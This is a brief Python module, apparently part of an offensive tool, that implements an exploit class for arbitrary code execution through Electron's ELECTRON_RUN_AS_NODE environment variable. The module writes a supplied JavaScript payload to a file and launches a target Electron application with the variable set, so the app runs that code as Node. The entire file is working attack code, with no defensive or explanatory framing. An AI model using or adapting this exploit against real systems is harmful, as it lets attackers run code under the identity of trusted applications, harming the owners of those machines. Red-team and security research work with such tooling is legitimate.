"""
run_as_node.py: Arbitrary Code Execution through Electron's 'ELECTRON_RUN_AS_NODE' environment variable
"""

import logging
import subprocess

from .base import Exploit


class RunAsNode(Exploit):

    def run(self):
        """
        Run the exploit
        """
        logging.info(f"Running exploit on {self._exploitable_application}")
        logging.info(f"JavaScript payload: {self._javascript_payload}")

        self._convert_javascript_payload_to_file(self._javascript_payload)
        subprocess.run(
            [self._exploitable_application, self._exploit_file.name],
            env={"ELECTRON_RUN_AS_NODE": "1"}
        )